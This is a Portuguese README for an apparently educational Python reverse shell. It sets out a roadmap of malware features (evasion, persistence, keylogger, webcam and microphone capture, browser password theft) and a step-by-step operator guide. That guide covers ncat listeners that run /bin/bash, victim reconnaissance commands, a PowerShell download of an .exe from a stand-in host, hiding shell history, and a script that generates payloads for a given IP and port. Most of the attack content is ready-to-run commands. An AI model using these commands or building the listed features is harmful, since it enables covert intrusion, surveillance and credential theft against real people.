
## 📋 Visão Geral

Este é um reverse shell básico implementado em Python para fins de estudo sobre segurança ofensiva, red teaming e desenvolvimento de malware educacional.

## 🚀 Funcionalidades Atuais

- Conexão TCP reversa
- Execução de comandos do sistema
- Navegação de diretórios (`cd`)
- Tratamento básico de erros
- Reconexão automática

## 🔧 Possíveis Melhorias e Novas Features

### 🔒 **1. Evasão e Stealth**
- [ ] **Múltiplos servidores failover** - Lista de C&C servers backup
- [ ] **Delay aleatório** - Tempo variável entre conexões
- [ ] **User-Agent spoofing** - Camuflagem em tráfego HTTP
- [ ] **Ofuscação de código** - Método básico de obfuscação
- [ ] **Processo hollow** - Injeção em processos legítimos

### 🌐 **2. Persistência**
- [ ] **Auto-start no boot** - Registro no Windows Registry
- [ ] **Verificação de instância única** - Evitar múltiplas execuções
- [ ] **Watchdog process** - Processo que monitora e reinicia
- [ ] **Scheduled tasks** - Tarefas agendadas para persistência
- [ ] **DLL hijacking** - Substituição de DLLs legítimas

### 📡 **3. Comunicação Avançada**
- [ ] **Criptografia AES/RSA** - Comunicação criptografada
- [ ] **HTTP(S) tunneling** - Camuflagem em tráfego web
- [ ] **DNS tunneling** - Comunicação via queries DNS
- [ ] **Protocol hopping** - Alternância entre protocolos
- [ ] **Heartbeat system** - Sistema de keep-alive

### 🎯 **4. Funcionalidades Extras**
- [ ] **Screenshots** - Captura de tela remota
- [ ] **Keylogger** - Captura de teclas digitadas
- [ ] **File download/upload** - Transferência de arquivos
- [ ] **Webcam capture** - Acesso à câmera
- [ ] **Microphone recording** - Gravação de áudio
- [ ] **Browser data theft** - Roubo de senhas/cookies
- [ ] **System enumeration** - Coleta de informações do sistema

### 🛡️ **5. Anti-Debug/VM Detection**
- [ ] **VM detection** - Detectar ambientes virtualizados
- [ ] **Debugger detection** - Identificar ferramentas de debug
- [ ] **Sandbox evasion** - Evitar análise em sandbox
- [ ] **Time-based evasion** - Delays para evitar análise automatizada
- [ ] **Mouse movement check** - Verificar interação humana

### 📱 **6. Cross-Platform**
- [ ] **Linux support** - Compatibilidade com sistemas Linux
- [ ] **macOS support** - Funcionalidades específicas para macOS
- [ ] **Android support** - Adaptação para dispositivos móveis
- [ ] **Auto-detection** - Detecção automática do SO

## 💻 Comandos Úteis para Teste

### Comandos Básicos de Sistema
```bash
# Informações do sistema
whoami
hostname
ipconfig /all          # Windows
ifconfig                # Linux
systeminfo             # Windows
uname -a               # Linux

# Navegação e arquivos
dir                    # Windows
ls -la                 # Linux
pwd
cd C:\                 # Windows
cd /etc               # Linux

# Processos e serviços
tasklist              # Windows
ps aux                # Linux
netstat -an           # Conexões de rede
net user              # Usuários Windows
cat /etc/passwd       # Usuários Linux

# Escalação de privilégios
net localgroup administrators  # Verificar admins Windows
sudo -l                        # Verificar sudo Linux
```

### Comandos Específicos para Pentest
```bash
# Descoberta de rede
arp -a                 # Tabela ARP
ping 192.168.1.1       # Teste de conectividade
nslookup google.com    # DNS lookup

# Coleta de informações
wmic product get name,version    # Software instalado (Windows)
dpkg -l                         # Pacotes instalados (Linux)
reg query HKLM\Software         # Registry Windows

# Transferência de arquivos (via PowerShell)
powershell -c "Invoke-WebRequest -Uri 'http://exemplo.com/arquivo.exe' -OutFile 'C:\temp\arquivo.exe'"

# Execução de scripts
powershell -ExecutionPolicy Bypass -File script.ps1
python -c "import os; os.system('whoami')"
```

## 🐧 Tutorial: Configurando Listener com Ncat no Kali Linux

### 1. Instalação (se necessário)
```bash
# Atualizar repositórios
sudo apt update

# Instalar ncat (parte do nmap)
sudo apt install nmap

# Verificar instalação
ncat --version
```

### 2. Configuração Básica do Listener

#### Método 1: Listener Simples
```bash
# Iniciar listener na porta 443
sudo ncat -lvnp 443

# Parâmetros explicados:
# -l: Listen mode (modo escuta)
# -v: Verbose (modo verboso)
# -n: Não resolver DNS
# -p: Porta específica
```

#### Método 2: Listener com Log
```bash
# Listener salvando logs
sudo ncat -lvnp 443 --output session.log

# Listener com prompt customizado
sudo ncat -lvnp 443 --exec /bin/bash
```

### 3. Configuração Avançada

#### HTTPS/SSL Listener
```bash
# Gerar certificado SSL
openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes

# Listener SSL
sudo ncat -lvnp 443 --ssl --ssl-cert server.pem --ssl-key server.pem
```

#### Listener com Script de Automação
```bash
#!/bin/bash
# listener.sh

echo "[+] Iniciando listener na porta 443..."
echo "[+] Aguardando conexão..."

sudo ncat -lvnp 443 --exec /bin/bash 2>&1 | tee session_$(date +%Y%m%d_%H%M%S).log
```

### 4. Comandos Úteis Durante a Sessão

```bash
# Manter sessão ativa
export HISTFILE=/dev/null    # Não salvar histórico
export HISTSIZE=0

# Upgrade para TTY interativo
python3 -c "import pty; pty.spawn('/bin/bash')"
# Ctrl+Z (background)
stty raw -echo; fg
# Enter, Enter
export TERM=screen

# Verificar conexões ativas
ss -tulnp | grep :443
netstat -tulnp | grep :443

# Monitorar conexões
sudo tcpdump -i any port 443
```

### 5. Exemplo de Uso Completo

#### Terminal 1 (Kali - Atacante)
```bash
# Configurar listener
cd ~/reverse_shell_sessions
sudo ncat -lvnp 443 --output victim_session.log

# Aguardar conexão
# [+] Listening on 0.0.0.0 443
# [+] Connection received on TARGET_IP RANDOM_PORT
```

#### Terminal 2 (Vítima - Windows)
```bash
# Executar o reverse shell Python
python index.py

# Ou compilado como .exe
index.exe
```

#### Terminal 1 (Após Conexão)
```bash
# Comandos de reconhecimento inicial
whoami
hostname
ipconfig
systeminfo | findstr /B "OS Name" "OS Version" "System Type"

# Exploração
dir C:\Users
net user
tasklist
```

## 🛠️ Scripts de Apoio

### Gerador Automático de Payload
```bash
#!/bin/bash
# generate_payload.sh

IP=$1
PORT=$2

if [ -z "$1" ] || [ -z "$2" ]; then
    echo "Uso: $0 <IP> <PORT>"
    exit 1
fi

sed "s/IP = '.*'/IP = '$IP'/g; s/PORT = .*/PORT = $PORT/g" index.py > payload_${IP}_${PORT}.py

echo "[+] Payload gerado: payload_${IP}_${PORT}.py"
```

### Monitor de Conexões
```bash
#!/bin/bash
# monitor.sh

while true; do
    echo "[$(date)] Verificando conexões na porta 443..."
    netstat -tulnp | grep :443
    sleep 30
done
```